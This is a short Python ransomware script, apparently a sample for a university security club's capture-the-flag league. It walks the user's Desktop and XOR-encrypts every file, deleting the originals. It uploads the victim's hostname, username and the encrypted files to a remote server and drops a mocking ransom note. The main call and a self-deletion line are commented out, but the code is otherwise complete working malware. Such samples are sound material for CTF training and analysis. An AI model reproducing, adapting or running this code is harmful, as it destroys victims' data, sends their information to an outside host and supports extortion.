from pathlib import Path
import datetime
from hashlib import md5
import platform
from random import randint
import urllib.request
import urllib.parse
import os
import tempfile
import zipfile
import getpass

baseURl = "https://yikes.ctf-league.osusec.org"
hostname= platform.node()
username=getpass.getuser()
randomThing = randint(1, 1333337)
time =datetime.date.today().isoformat()
secretkey = md5((hostname + str(randomThing) + time).encode()).digest()

ransomTemplate="""
YOUVE BEEN MOGGED LOL 

if u evr want ur files back go to

>>> {baseurl}/ransom/?id={ransomid} <<<

but evrythign comes @ a price so u bettr pay up

react to affirm you understand -->
skibidiGang
"""

def Encrypt_Files_and_upload():
    Folderpath = os.path.expanduser("~/Desktop")
    with tempfile.TemporaryFile() as temp:
        with zipfile.ZipFile(temp, "w") as zipped:
            for dirpath, _, filenames in os.walk(Folderpath):
                for file in filenames:
                    filepath = dirpath + "/" + file
                    encpath = encryptfile(filepath)
                    zipped.write(encpath)

        victimData = {
            "hostname": hostname,
            "username": username,
            "time": time,
        }
        victimEnc = urllib.parse.urlencode(victimData).encode("utf-8")
        keyrRq = urllib.request.Request(baseURl + "/victim", data=victimEnc)
        keyrsp = urllib.request.urlopen(keyrRq)

        if keyrsp.status == 201:
            ransomid=keyrsp.read().decode()
            temp.seek(0)
            upload_req = urllib.request.Request(baseURl + "/files/" + ransomid, data=temp, headers={"Content-Type": "application/zip"}, method="PUT")
            Resp = urllib.request.urlopen(upload_req)

            # TODO: os.path.join
            ransomNote = ransomTemplate.format(baseurl=baseURl,ransomid=ransomid)
            with open(Folderpath + "/ransom.txt", "w") as f:
                f.write(ransomNote)



        

def encryptfile(filepath):
    with open(filepath, "rb") as f:
        contents =bytearray(f.read())

    for i in range(len(contents)):
        contents[i] ^= secretkey[i % len(secretkey)]

    os.remove(filepath)
    enc_path = filepath + ".ohio"
    with open(enc_path, "wb") as f:
        f.write(contents)

    return enc_path

# (commented out so you don't encrypt your files)
# (don't uncomment this or I will be sad)
# Encrypt_Files_and_upload()

# COMMENTED FOR TESRTING, UNCOMMENT BEFORE USING FORERAL
# os.remove(__file__)
